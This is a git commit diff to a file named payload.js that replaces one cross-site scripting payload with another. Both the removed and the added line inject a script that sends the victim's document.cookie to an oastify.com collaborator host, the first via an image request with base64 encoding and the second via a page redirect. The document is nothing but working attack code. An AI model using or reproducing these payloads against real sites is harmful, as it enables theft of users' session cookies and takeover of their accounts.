3d025d4d988e12bd0fc2d1e1df62f1a49583a338
skalvin <103864971+skalvin@users.noreply.github.com>
2024-06-02 21:25:24 +0300

    Update payload.js

--- payload.js
+++ payload.js
@@ -1,1 +1,1 @@
-l332t>"<script>var i=new Image(); i.src="https://axbym18fkbbwo16v7vie25e61x7nvc.oastify.com/?cookie="+btoa(document.cookie);</script>l33to
+<script>document.location="https://qtneih4vgr7ckh2b3beuylamxd35ru.oastify.com/" + document.cookie </script>
